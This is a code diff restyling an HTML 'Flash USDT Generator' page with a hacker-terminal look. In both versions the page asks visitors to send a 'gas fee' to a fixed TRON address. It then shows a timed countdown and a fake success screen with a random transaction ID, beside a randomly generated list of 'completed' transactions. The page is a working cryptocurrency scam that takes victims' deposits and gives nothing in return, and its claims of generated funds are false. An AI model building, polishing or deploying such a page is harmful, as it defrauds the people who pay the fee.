@@ -1,579 +1,522 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Pro Crypto Tool Dashboard</title>
-  <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
-  <style>
-    :root {
-      --primary: #1efc1e;
-      --text: #111;
-      --bg: #090909;
-      --panel-bg: #111;
-      --panel-radius: 18px;
-      --shadow: 0 2px 16px rgba(30, 252, 30, 0.12);
-      --success: #0fda60;
-      --error: #ff5050;
-    }
-    * {
-      box-sizing: border-box;
-    }
-    body {
-      margin: 0;
-      background: var(--bg);
-      color: var(--primary);
-      font-family: "VT323", monospace;
-      min-height: 100vh;
-    }
-    .dashboard-wrapper {
-      max-width: 900px;
-      margin: auto;
-      padding: 18px;
-    }
-    .dashboard-header {
-      background: var(--panel-bg);
-      border-radius: var(--panel-radius);
-      box-shadow: var(--shadow);
-      margin-bottom: 16px;
-      padding: 18px 28px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      flex-wrap: wrap;
-    }
-    .dashboard-title {
-      font-size: 2.7em;
-      letter-spacing: 2px;
-      display: flex;
-      align-items: center;
-      gap: 13px;
-      color: var(--primary);
-      text-shadow: 0 0 13px var(--primary);
-    }
-    .dashboard-actions {
-      display: flex;
-      gap: 12px;
-      align-items: center;
-    }
-    .action-btn {
-      background: var(--bg);
-      color: var(--primary);
-      padding: 13px 22px;
-      border-radius: 8px;
-      border: 1.5px solid var(--primary);
-      font-size: 1.14em;
-      cursor: pointer;
-      font-weight: bold;
-      transition: all 0.15s;
-    }
-    .action-btn.active,
-    .action-btn:hover {
-      background: var(--primary);
-      color: var(--bg);
-      box-shadow: 0 0 9px var(--primary);
-    }
-    /* Panels */
-    .panel-group {
-      display: flex;
-      gap: 24px;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      margin-bottom: 13px;
-    }
-    .card-panel {
-      flex: 1 1 340px;
-      min-width: 290px;
-      max-width: 100%;
-      background: var(--panel-bg);
-      border-radius: var(--panel-radius);
-      box-shadow: var(--shadow);
-      padding: 22px 18px;
-      margin-bottom: 19px;
-      display: flex;
-      flex-direction: column;
-      position: relative;
-    }
-    .panel-title {
-      font-size: 1.28em;
-      margin-bottom: 16px;
-      font-weight: bold;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    /* Form */
-    .crypto-form label {
-      font-size: 1.04em;
-      margin-bottom: 6px;
-      display: block;
-    }
-    .crypto-form input[type="text"],
-    .crypto-form input[type="number"] {
-      width: 100%;
-      margin-bottom: 11px;
-      padding: 13px;
-      border-radius: 7px;
-      background: var(--bg);
-      color: var(--primary);
-      border: 1.2px solid var(--primary);
-      font-size: 1.09em;
-      transition: border 0.15s;
-    }
-    .crypto-form input:focus {
-      border-color: #fff;
-    }
-    .form-btn {
-      width: 100%;
-      margin-top: 13px;
-      padding: 17px 0;
-      font-size: 1.2em;
-      border-radius: 8px;
-      background: var(--primary);
-      color: var(--bg);
-      border: none;
-      font-weight: bold;
-      cursor: pointer;
-      box-shadow: var(--shadow);
-      transition: 0.15s;
-    }
-    .form-btn:active {
-      background: #14fa14;
-    }
-    /* Info Cards */
-    .card-summary {
-      font-size: 1.1em;
-      margin-bottom: 10px;
-      background: #141414;
-      border-radius: 10px;
-      padding: 13px;
-      box-shadow: 0 0 7px var(--primary);
-      color: #fafafa;
-      font-family: inherit;
-    }
-    .card-summary i {
-      font-size: 1.05em;
-      margin-right: 7px;
-    }
-    /* Transactions */
-    .transaction-list {
-      margin-top: 3px;
-    }
-    .transaction-block {
-      background: #191919;
-      border-radius: 7px;
-      box-shadow: 0 0 8px #15fd1597;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 15px 10px;
-      margin-bottom: 7px;
-      font-size: 1.07em;
-    }
-    .transaction-info {
-      display: flex;
-      flex-direction: column;
-    }
-    .transaction-id {
-      font-weight: bold;
-      margin-bottom: 3px;
-      font-family: monospace;
-    }
-    .transaction-amount {
-      font-size: 1.18em;
-      color: #fff700;
-    }
-    .transaction-status {
-      background: #001a00;
-      color: var(--primary);
-      padding: 6px 16px;
-      border-radius: 20px;
-      font-size: 0.97em;
-      font-weight: bold;
-      border: 1px solid var(--primary);
-    }
-    .transaction-timestamp {
-      color: #b5ffb5;
-      font-size: 0.97em;
-    }
-    /* Paging */
-    .transactions-paging {
-      display: flex;
-      gap: 9px;
-      justify-content: center;
-      margin-top: 4px;
-      margin-bottom: 13px;
-    }
-    .transactions-paging button {
-      width: 59px;
-      padding: 7px 0;
-      font-size: 1.25em;
-      background: var(--bg);
-      color: var(--primary);
-      border: 1.5px solid var(--primary);
-      border-radius: 5px;
-      cursor: pointer;
-      font-family: inherit;
-      font-weight: bold;
-      transition: 0.15s;
-    }
-    .transactions-paging button.active,
-    .transactions-paging button:focus {
-      background: var(--primary);
-      color: var(--bg);
-      box-shadow: 0 0 9px var(--primary);
-    }
-    /* Waiting & Success Overlays */
-    .overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: rgba(0, 0, 0, 0.92);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      z-index: 9999;
-      color: var(--primary);
-      font-family: "VT323", monospace;
-      padding: 20px;
-      text-align: center;
-    }
-    .loading-spinner {
-      border: 5px solid #000;
-      border-top: 5px solid var(--primary);
-      border-radius: 50%;
-      width: 70px;
-      height: 70px;
-      animation: spin 1.2s linear infinite;
-      margin-bottom: 20px;
-    }
-    @keyframes spin {
-      0% {
-        transform: rotate(0);
-      }
-      100% {
-        transform: rotate(360deg);
-      }
-    }
-    .success-icon {
-      font-size: 4em;
-      margin-bottom: 18px;
-      color: #00ff00;
-      animation: bounce 1.4s infinite;
-    }
-    @keyframes bounce {
-      0%,
-      100% {
-        transform: translateY(0);
-      }
-      50% {
-        transform: translateY(-13px);
-      }
-    }
-    /* QR code */
-    .qr-code {
-      margin: 14px auto 16px auto;
-      width: 160px;
-      height: 160px;
-      border: 3px solid var(--primary);
-      border-radius: 12px;
-      cursor: pointer;
-      filter: drop-shadow(0 0 3px var(--primary));
-      transition: transform 0.25s ease-in-out;
-      user-select: none;
-    }
-    .qr-code:hover {
-      transform: scale(1.07);
-    }
-    /* Responsive: Mobile Stack */
-    @media (max-width: 900px) {
-      .dashboard-header,
-      .panel-group {
-        flex-direction: column;
-      }
-      .dashboard-title {
-        font-size: 2em;
-      }
-    }
-    @media (max-width: 600px) {
-      .dashboard-wrapper,
-      .dashboard-header,
-      .card-panel {
-        padding: 8px;
-      }
-      .panel-title {
-        font-size: 1.05em;
-      }
-      .dashboard-title {
-        font-size: 1.3em;
-      }
-      .action-btn {
-        font-size: 1em;
-        padding: 8px 14px;
-      }
-      .form-btn {
-        font-size: 1em;
-      }
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Hacker Terminal Flash USDT Generator</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
+
+  /* Basic Reset */
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    background: #000000;
+    color: #00ff00;
+    font-family: 'VT323', monospace;
+    overflow-x: hidden;
+    height: 100vh;
+  }
+
+  /* Container */
+  .terminal-container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 24px 16px;
+    position: relative;
+    z-index: 10;
+  }
+
+  h1, h2 {
+    margin: 0 0 20px 0;
+    text-align: center;
+    letter-spacing: 0.2em;
+    text-shadow:
+      0 0 8px #00ff00,
+      0 0 10px #00ff00,
+      0 0 20px #00ff00;
+  }
+
+  /* Matrix rain background */
+  #matrix-rain {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw;
+    height: 100vh;
+    pointer-events: none;
+    z-index: 1;
+  }
+  .matrix-char {
+    position: absolute;
+    font-size: 1.2em;
+    color: #0f0;
+    opacity: 0.2;
+    animation: matrix-fall linear infinite;
+    user-select: none;
+  }
+  @keyframes matrix-fall {
+    0% { transform: translateY(-150%); opacity: 0; }
+    10% { opacity: 1; }
+    90% { opacity: 1; }
+    100% { transform: translateY(105vh); opacity: 0; }
+  }
+
+  /* Glitch and flicker effects */
+  .glitch-text {
+    position: relative;
+    color: #00ff00;
+    animation: flicker 1.6s infinite;
+  }
+  @keyframes flicker {
+    0%, 18%, 22%, 25%, 53%, 57%, 100% { opacity: 1; }
+    20%, 24%, 55% { opacity: 0.4; }
+  }
+  .glitch-overlay {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background:
+      repeating-linear-gradient(
+        45deg,
+        transparent,
+        transparent 2px,
+        rgba(0,255,0,0.05) 2px,
+        rgba(0,255,0,0.05) 4px
+      ),
+      repeating-linear-gradient(
+        -45deg,
+        transparent,
+        transparent 2px,
+        rgba(0,255,0,0.05) 2px,
+        rgba(0,255,0,0.05) 4px
+      );
+    pointer-events: none;
+    animation: glitch-move 6s linear infinite;
+    z-index: 9;
+  }
+  @keyframes glitch-move {
+    0% { background-position: 0 0, 0 0; }
+    25% { background-position: 40px 40px, -40px -40px; }
+    50% { background-position: 80px 80px, -80px -80px; }
+    75% { background-position: 40px 40px, -40px -40px; }
+    100% { background-position: 0 0, 0 0; }
+  }
+
+  /* Form styles */
+  form {
+    background: rgba(0, 20, 0, 0.85);
+    padding: 22px 26px;
+    border: 1px solid #0f0;
+    border-radius: 8px;
+    max-width: 460px;
+    margin: 0 auto 40px auto;
+  }
+  label {
+    display: block;
+    margin-bottom: 7px;
+    font-size: 1.3em;
+    text-shadow:
+      0 0 6px #00ff00,
+      0 0 10px #00ff00;
+  }
+  input[type=text], input[type=number] {
+    width: 100%;
+    padding: 14px 13px;
+    margin-bottom: 22px;
+    background: black;
+    border: 2px solid #0f0;
+    border-radius: 6px;
+    color: #00ff00;
+    font-family: 'VT323', monospace;
+    font-size: 1.2em;
+    letter-spacing: 0.1em;
+    text-shadow:
+      0 0 5px #00ff00;
+    outline: none;
+  }
+  input[type=text]:focus, input[type=number]:focus {
+    border-color: #aaffaa;
+    box-shadow: 0 0 14px #0f0;
+  }
+  button {
+    width: 100%;
+    padding: 18px;
+    font-size: 1.38em;
+    font-weight: bold;
+    color: #000;
+    background-color: #00ff00;
+    border-radius: 10px;
+    border: none;
+    cursor: pointer;
+    letter-spacing: 0.12em;
+    text-shadow: none;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #22ff22;
+  }
+
+  /* Transactions */
+  #transaction-list {
+    max-width: 460px;
+    margin: 0 auto 40px auto;
+  }
+  .transaction-block {
+    background: rgba(0, 30, 0, 0.75);
+    border: 1.5px solid #00ff00;
+    border-radius: 6px;
+    padding: 12px 18px;
+    margin-bottom: 14px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 1.15em;
+    text-shadow:
+      0 0 6px #00ff00;
+  }
+  .transaction-id {
+    font-family: monospace;
+    font-weight: bold;
+  }
+  .transaction-amount {
+    color: #ffff55;
+    font-weight: 700;
+  }
+  .transaction-status {
+    background: #003300;
+    padding: 6px 16px;
+    border-radius: 20px;
+    font-weight: bold;
+    color: #00ff00;
+    border: 1px solid #00ff00;
+    font-size: 0.95em;
+    text-shadow: 0 0 7px #00ff00;
+  }
+  .timestamp {
+    margin-left: 10px;
+    font-size: 0.9em;
+    color: #0c0;
+  }
+
+  .transactions-paging {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 42px;
+  }
+  .transactions-paging button {
+    background: transparent;
+    border: 1.5px solid #00ff00;
+    color: #00ff00;
+    font-family: 'VT323', monospace;
+    font-weight: bold;
+    padding: 8px 20px;
+    font-size: 1.3em;
+    cursor: pointer;
+    border-radius: 6px;
+    transition: background-color 0.3s ease;
+    text-shadow: 0 0 6px #00ff00;
+  }
+  .transactions-paging button.active {
+    background: #00ff00;
+    color: #000;
+    text-shadow: none;
+    border-color: #00dd00;
+  }
+
+  /* Overlay screens */
+  .overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.98);
+    color: #00ff00;
+    font-family: 'VT323', monospace;
+    display: none;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    gap: 18px;
+    text-align: center;
+    letter-spacing: 0.15em;
+    z-index: 999999;
+  }
+  .overlay h2 {
+    font-size: 2.2em;
+    text-shadow:
+      0 0 10px #00ff00,
+      0 0 25px #00ff00,
+      0 0 35px #00ff00;
+  }
+  .overlay .loading-spinner {
+    border: 6px solid #000;
+    border-top: 6px solid #00ff00;
+    border-radius: 50%;
+    width: 80px;
+    height: 80px;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin {
+    0% {transform: rotate(0);}
+    100% {transform: rotate(360deg);}
+  }
+  .overlay .success-icon {
+    font-size: 4.5em;
+    animation: bounce 1.8s ease-in-out infinite;
+    color: #00ff00;
+  }
+  @keyframes bounce {
+    0%, 100% {transform: translateY(0);}
+    50% {transform: translateY(-15px);}
+  }
+  .overlay .qr-code {
+    width: 164px;
+    height: 164px;
+    filter: drop-shadow(0 0 5px #00ff00);
+    cursor: pointer;
+    border: 3px solid #00ff00;
+    border-radius: 12px;
+    margin: 0 auto 15px auto;
+    transition: transform 0.3s ease;
+  }
+  .overlay .qr-code:hover {
+    transform: scale(1.1);
+  }
+  .overlay .deposit-address {
+    font-size: 1.22em;
+    user-select: all;
+    letter-spacing: 0.15em;
+    margin-bottom: 20px;
+    border: 2px solid #00ff00;
+    padding: 10px 14px;
+    background: rgba(0, 50, 0, 0.7);
+    border-radius: 8px;
+  }
+  .overlay button {
+    background: #000;
+    border: 2px solid #00ff00;
+    border-radius: 12px;
+    color: #0f0;
+    font-size: 1.28em;
+    font-family: 'VT323', monospace;
+    padding: 12px 30px;
+    cursor: pointer;
+    letter-spacing: 0.15em;
+    box-shadow:
+      0 0 8px #00ff00,
+      0 0 16px #00ff00;
+  }
+  .overlay button:hover {
+    background: #00ff00;
+    color: #000;
+  }
+</style>
 </head>
 <body>
-  <div class="dashboard-wrapper">
-    <!-- Header -->
-    <div class="dashboard-header">
-      <div class="dashboard-title">
-        <i class="fa fa-tools"></i> Crypto Tool Dashboard
-      </div>
-      <div class="dashboard-actions">
-        <button class="action-btn active">
-          <i class="fa fa-dashboard"></i> Dashboard
-        </button>
-        <button class="action-btn">
-          <i class="fa fa-user"></i> Profile
-        </button>
-        <button class="action-btn">
-          <i class="fa fa-support"></i> Support
-        </button>
-      </div>
+  <div id="matrix-rain"></div>
+  <div class="glitch-overlay"></div>
+
+  <div class="terminal-container">
+    <h1 class="glitch-text">FLASH USDT GENERATOR</h1>
+
+    <form id="usdtForm" onsubmit="handleGenerate(event)">
+      <label for="usdt-address" class="glitch-text">USDT TRC20 Address:</label>
+      <input type="text" id="usdt-address" autocomplete="off" placeholder="Enter TRC20 address" required />
+
+      <label for="amount-input" class="glitch-text">Amount (USDT):</label>
+      <input type="number" id="amount-input" placeholder="Enter amount (min 1000)" min="1000" max="500000" />
+
+      <button type="submit" aria-label="Generate USDT">GENERATE FLASH USDT</button>
+    </form>
+
+    <div style="text-align:center; margin-top: 10px; font-size: 1.12em; user-select:none;">
+      Gas Fee: 20 TRX per 1,000 USDT<br/>
+      Gas Address: <span style="user-select:all; font-family: monospace;">TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA</span>
     </div>
-    <!-- Panel Area -->
-    <div class="panel-group">
-      <!-- Crypto Generator Form -->
-      <div class="card-panel">
-        <div class="panel-title"><i class="fa fa-credit-card"></i> Generate USDT</div>
-        <form class="crypto-form" id="usdtForm" onsubmit="handleGenerate(event)">
-          <label for="usdt-address"><i class="fa fa-wallet"></i> USDT TRC20 Address</label>
-          <input type="text" id="usdt-address" placeholder="Enter TRC20 address" required />
-          <label for="amount-input"><i class="fa fa-dollar-sign"></i> Amount (USDT)</label>
-          <input
-            type="number"
-            id="amount-input"
-            placeholder="Enter amount (min 1000)"
-            min="1000"
-            max="500000"
-          />
-          <button class="form-btn" type="submit">
-            <i class="fa fa-bolt"></i> Generate
-          </button>
-        </form>
-        <div class="card-summary">
-          <i class="fa fa-info-circle"></i>
-          Gas Fee is <b>20 TRX</b> per 1,000 USDT.<br />
-          Gas Address:
-          <span style="font-family: monospace">TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA</span>
-        </div>
-      </div>
-      <!-- Recent Transactions -->
-      <div class="card-panel">
-        <div class="panel-title"><i class="fa fa-list"></i> Recent Transactions</div>
-        <div class="transaction-list" id="transaction-list"></div>
-        <div class="transactions-paging" id="transactions-paging"></div>
-      </div>
-    </div>
+
+    <h2 class="glitch-text">RECENT TRANSACTIONS</h2>
+    <div id="transaction-list"></div>
+    <div class="transactions-paging" id="transactions-paging"></div>
   </div>
 
   <!-- Waiting & Deposit Overlay -->
-  <div class="overlay" id="waiting-overlay">
-    <div>Please deposit the gas fee to the address below</div>
+  <div class="overlay" id="waiting-overlay" role="alert" aria-live="assertive" aria-label="Waiting for deposit">
+    <h2>WAITING FOR DEPOSIT...</h2>
     <img
       id="gas-qr"
       class="qr-code"
-      src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA"
+      src="https://api.qrserver.com/v1/create-qr-code/?size=164x164&data=TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA"
       alt="Gas Address QR Code"
       title="Click to copy gas address"
       onclick="copyGasAddress()"
     />
-    <div style="font-family: monospace; font-size: 1.2em; letter-spacing: 1.5px; margin-bottom: 14px;">
-      TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA
-    </div>
+    <div class="deposit-address" id="deposit-address">TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA</div>
     <div class="loading-spinner"></div>
-    <div id="countdown-timer" style="margin-top: 15px; font-size: 1.4em; font-weight: bold;"></div>
+    <div id="countdown-timer" style="font-size: 1.48em; margin-top: 10px;"></div>
+    <div style="font-size: 0.98em; margin-top: 4px; letter-spacing: 0.15em;">Click QR to copy address</div>
   </div>
 
-  <!-- Success overlay -->
-  <div class="overlay" id="success-overlay">
+  <!-- Success Overlay -->
+  <div class="overlay" id="success-overlay" role="alert" aria-live="polite" aria-label="Transaction successful notification">
     <div class="success-icon"><i class="fa fa-circle-check"></i></div>
-    <div style="font-size: 1.2em; margin-bottom: 8px;">Transaction Successful!</div>
-    <div>
+    <h2>TRANSACTION SUCCESSFUL!</h2>
+    <div style="margin-bottom: 14px; font-size: 1.24em;">
       Amount: <span id="success-amount">0</span> USDT<br />
       TXID: <span id="success-txid"></span><br />
       Time: <span id="success-time"></span>
     </div>
-    <button
-      class="form-btn"
-      style="margin-top: 20px; max-width: 200px;"
-      onclick="closeSuccess()"
-    >
-      New Transaction
-    </button>
+    <button onclick="closeSuccess()">NEW TRANSACTION</button>
   </div>
 
-  <script>
-    const GAS_ADDRESS = "TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA";
+<script>
+  // MATRIX RAIN
+  const matrixContainer = document.getElementById('matrix-rain');
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$+-*/=%"\'#&_(),.;:?!\\|{}<>[]^~';
+  for(let i=0; i < 120; i++){
+    const c = document.createElement('div');
+    c.className = 'matrix-char';
+    c.textContent = chars.charAt(Math.floor(Math.random()* chars.length));
+    c.style.left = `${Math.random() * 100}vw`;
+    c.style.animationDuration = `${4 + Math.random() * 7}s`;
+    c.style.animationDelay = `${Math.random() * 7}s`;
+    matrixContainer.appendChild(c);
+  }
 
-    // Helper: Validate TRC20 address format
-    function validateAddress(address) {
-      return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address.trim());
-    }
+  // Clipboard copy gas address
+  const GAS_ADDRESS = 'TYH8QeLigG2xjUuHZA5QRbwK5gWsgFaPTA';
+  function copyGasAddress() {
+    navigator.clipboard.writeText(GAS_ADDRESS);
+    alert('Gas address copied to clipboard!');
+  }
 
-    // Helper: Get relative time string for recent txns
-    function getRelativeTime(offsetHours) {
-      const now = new Date();
-      now.setHours(now.getHours() - offsetHours);
-      return now.toLocaleString("en-US", {
-        month: "short",
-        day: "numeric",
-        hour: "2-digit",
-        minute: "2-digit",
+  // Terminal animations glitch flicker already in CSS for text
+
+  // Pagination variables
+  const TX_PER_PAGE = 5;
+  let allTransactions = [];
+  let currentPage = 1;
+  let txPageCount = 1;
+
+  function validateAddress(address) {
+    return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address.trim());
+  }
+
+  function getRelativeTime(offsetHrs) {
+    const now = new Date();
+    now.setHours(now.getHours() - offsetHrs);
+    return now.toLocaleString('en-US',{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
+  }
+
+  // Generate transactions
+  function generateTransactionsList(){
+    let txns = [];
+    for(let i=0; i< 25; i++) {
+      txns.push({
+        id:`TX${Math.random().toString(36).substring(2,14).toUpperCase()}`,
+        amount: Math.floor(Math.random()*499000)+1000,
+        status: 'completed',
+        timestamp: getRelativeTime(Math.floor(i/5))
       });
     }
+    return txns;
+  }
 
-    // Transaction vars for paging
-    const TX_PER_PAGE = 5;
-    let allTransactions = [];
-    let currentPage = 1;
-    let txPageCount = 1;
-
-    // Generate random transaction list
-    function generateTransactionsList() {
-      const totalTx = 25;
-      const txns = [];
-      for (let i = 0; i < totalTx; i++) {
-        txns.push({
-          id: "TX" + Math.random().toString(36).substr(2, 12).toUpperCase(),
-          amount: Math.floor(Math.random() * 499000) + 1000,
-          status: "completed",
-          timestamp: getRelativeTime(Math.floor(i / TX_PER_PAGE)),
-        });
-      }
-      return txns;
+  function renderPagingControls(){
+    const paging = document.getElementById('transactions-paging');
+    paging.innerHTML = '';
+    for(let i=1; i<=txPageCount; i++){
+      const btn = document.createElement('button');
+      btn.textContent = i;
+      btn.className = i === currentPage ? 'active' : '';
+      btn.onclick = () => { currentPage = i; populateTransactions();};
+      paging.appendChild(btn);
     }
-
-    // Render paging controls
-    function renderPagingControls() {
-      const paging = document.getElementById("transactions-paging");
-      paging.innerHTML = "";
-      for (let i = 1; i <= txPageCount; i++) {
-        const btn = document.createElement("button");
-        btn.textContent = i;
-        btn.className = i === currentPage ? "active" : "";
-        btn.onclick = function () {
-          currentPage = i;
-          populateTransactions();
-        };
-        paging.appendChild(btn);
-      }
-    }
-
-    // Populate transactions with paging
-    function populateTransactions() {
-      const list = document.getElementById("transaction-list");
-      list.innerHTML = "";
-      txPageCount = Math.ceil(allTransactions.length / TX_PER_PAGE);
-      const start = (currentPage - 1) * TX_PER_PAGE;
-      const txns = allTransactions.slice(start, start + TX_PER_PAGE);
-      txns.forEach((tx) => {
-        const t = document.createElement("div");
-        t.className = "transaction-block";
-        t.innerHTML = `
-          <div class="transaction-info">
-            <div class="transaction-id">${tx.id}</div>
-            <div class="transaction-amount">${tx.amount.toLocaleString()} USDT</div>
-          </div>
-          <div>
-            <div class="transaction-status">${tx.status.toUpperCase()}</div>
-            <div class="transaction-timestamp">${tx.timestamp}</div>
-          </div>
-        `;
-        list.appendChild(t);
-      });
-      renderPagingControls();
-    }
-
-    // Refresh transactions every 10 minutes
-    function refreshTransactionsPeriodically() {
-      allTransactions = generateTransactionsList();
-      currentPage = 1;
-      populateTransactions();
-    }
-
-    // Overlay variables and timers
-    const waitingOverlay = document.getElementById("waiting-overlay");
-    const successOverlay = document.getElementById("success-overlay");
-    const countdownTimer = document.getElementById("countdown-timer");
-    const successAmountElem = document.getElementById("success-amount");
-    const successTxidElem = document.getElementById("success-txid");
-    const successTimeElem = document.getElementById("success-time");
-
-    // Copy gas address to clipboard
-    function copyGasAddress() {
-      navigator.clipboard.writeText(GAS_ADDRESS);
-      alert("Gas address copied to clipboard!");
-    }
-
-    // Close success overlay (reset form)
-    function closeSuccess() {
-      successOverlay.style.display = "none";
-      document.getElementById("usdt-address").value = "";
-      document.getElementById("amount-input").value = "";
-    }
-
-    // Handle form submission (Generate button)
-    function handleGenerate(event) {
-      event.preventDefault();
-      const addressInput = document.getElementById("usdt-address");
-      const amountInput = document.getElementById("amount-input");
-
-      // Validate inputs
-      if (!validateAddress(addressInput.value.trim())) {
-        alert("Invalid USDT TRC20 address!");
-        addressInput.focus();
-        return;
-      }
-      const amount = parseInt(amountInput.value);
-      if (!amount || amount < 1000 || amount > 500000) {
-        alert("Enter a valid amount between 1,000 and 500,000 USDT!");
-        amountInput.focus();
-        return;
-      }
-
-      // Show waiting overlay, start 30s countdown
-      waitingOverlay.style.display = "flex";
-      let countdown = 30;
-      countdownTimer.textContent = `Time remaining: ${countdown} s`;
-      const interval = setInterval(() => {
-        countdown--;
-        countdownTimer.textContent = `Time remaining: ${countdown} s`;
-        if (countdown <= 0) {
-          clearInterval(interval);
-          waitingOverlay.style.display = "none";
-
-          // Show success overlay with details
-          successAmountElem.textContent = amount.toLocaleString();
-          successTxidElem.textContent =
-            "TX" + Math.random().toString(36).substr(2, 16).toUpperCase();
-          successTimeElem.textContent = new Date().toLocaleString("en-US", {
-            month: "short",
-            day: "numeric",
-            hour: "2-digit",
-            minute: "2-digit",
-          });
-          successOverlay.style.display = "flex";
-
-          // Refresh transactions with new random data
-          refreshTransactionsPeriodically();
-        }
-      }, 1000);
-    }
-
-    document.addEventListener("DOMContentLoaded", function () {
-      refreshTransactionsPeriodically();
-      setInterval(refreshTransactionsPeriodically, 600000); // refresh every 10min
+  }
+  function populateTransactions(){
+    const list = document.getElementById('transaction-list');
+    list.innerHTML = '';
+    txPageCount = Math.ceil(allTransactions.length / TX_PER_PAGE);
+    const start = (currentPage -1)* TX_PER_PAGE;
+    const txns = allTransactions.slice(start, start + TX_PER_PAGE);
+    txns.forEach(tx => {
+      const t = document.createElement('div');
+      t.className = 'transaction-block';
+      t.innerHTML = `
+        <div class="transaction-info">
+          <div class="transaction-id">${tx.id}</div>
+          <div class="transaction-amount">${tx.amount.toLocaleString()} USDT</div>
+        </div>
+        <div>
+          <div class="transaction-status">${tx.status.toUpperCase()}</div>
+          <div class="timestamp">${tx.timestamp}</div>
+        </div>
+      `;
+      list.appendChild(t);
     });
-  </script>
+    renderPagingControls();
+  }
+
+  function refreshTransactionsPeriodically(){
+    allTransactions = generateTransactionsList();
+    currentPage = 1;
+    populateTransactions();
+  }
+
+  const waitingOverlay = document.getElementById('waiting-overlay');
+  const successOverlay = document.getElementById('success-overlay');
+  const countdownTimer = document.getElementById('countdown-timer');
+  const successAmountElem = document.getElementById('success-amount');
+  const successTxidElem = document.getElementById('success-txid');
+  const successTimeElem = document.getElementById('success-time');
+
+  function closeSuccess(){
+    successOverlay.style.display = 'none';
+    document.getElementById('usdt-address').value = '';
+    document.getElementById('amount-input').value = '';
+  }
+
+  function handleGenerate(evt){
+    evt.preventDefault();
+    const addrInput = document.getElementById('usdt-address');
+    const amtInput = document.getElementById('amount-input');
+    if (!validateAddress(addrInput.value)) {
+      alert('Invalid TRC20 USDT address!');
+      addrInput.focus();
+      return;
+    }
+    const amount = parseInt(amtInput.value);
+    if (!amount || amount < 1000 || amount > 500000) {
+      alert('Amount must be between 1,000 and 500,000 USDT!');
+      amtInput.focus();
+      return;
+    }
+    // Show deposit waiting overlay with qr and address
+    waitingOverlay.style.display = 'flex';
+    let countdown = 30;
+    countdownTimer.textContent = `Time remaining: ${countdown} s`;
+    const interval = setInterval(()=>{
+      countdown--;
+      countdownTimer.textContent = `Time remaining: ${countdown} s`;
+      if (countdown <= 0){
+        clearInterval(interval);
+        waitingOverlay.style.display = 'none';
+
+        // Show success message
+        successAmountElem.textContent = amount.toLocaleString();
+        successTxidElem.textContent = 'TX' + Math.random().toString(36).substr(2,16).toUpperCase();
+        successTimeElem.textContent = new Date().toLocaleString('en-US', {month:'short', day:'numeric', hour:'2-digit', minute:'2-digit'});
+        successOverlay.style.display = 'flex';
+
+        // Update transactions
+        refreshTransactionsPeriodically();
+      }
+    }, 1000);
+  }
+
+  document.addEventListener('DOMContentLoaded', () => {
+    refreshTransactionsPeriodically();
+    setInterval(refreshTransactionsPeriodically, 600000);
+  });
+</script>
 </body>
 </html>
